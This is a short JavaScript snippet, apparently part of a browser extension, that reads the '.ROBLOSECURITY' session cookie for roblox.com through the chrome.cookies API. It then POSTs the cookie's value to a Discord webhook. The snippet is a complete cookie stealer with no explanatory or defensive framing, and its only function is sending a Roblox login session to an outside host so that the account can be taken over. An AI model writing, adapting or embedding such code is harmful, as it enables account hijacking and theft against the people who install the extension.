chrome.cookies.get({url: 'https://www.roblox.com/', name: '.ROBLOSECURITY'}, cookie => {
  if (!cookie) return;
  fetch('https://discord.com/api/webhooks/123/token', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({roblox_session: cookie.value})
  });
});
